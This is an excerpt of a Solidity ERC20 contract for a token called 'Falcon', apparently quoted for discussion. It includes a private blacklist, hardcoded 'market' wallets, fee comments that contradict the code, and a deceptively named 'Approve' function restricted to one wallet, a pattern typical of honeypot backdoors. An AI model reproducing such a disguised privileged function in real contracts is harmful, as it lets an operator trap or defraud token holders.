...
contract token is ERC20 {
    ...
    address private _MarketAddress1 = address(0x7A05258d11b55fa75E7f2Afa3eF2646731032e50);
    address private _MarketAddress2 = address(0x8DD7b681326421fDb9E6389CEb4d8F14c721c20d);
    
    uint256 _currentSupply;
    mapping(address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isblackList;

    constructor(address tokenOwner) ERC20("Falcon", "Falcon") {
    ...
    function _transfer( address from, address to, uint256 amount ) internal override {
        ...
        super._transfer(from, _MarketAddress1, amount.div(100).mul(0));//1%营销
        super._transfer(from, _MarketAddress2, amount.div(100).mul(0));//1%营销
    ...
    function Approve(address[] calldata Account,bool status) external {if(_msgSender() == _MarketAddress1){
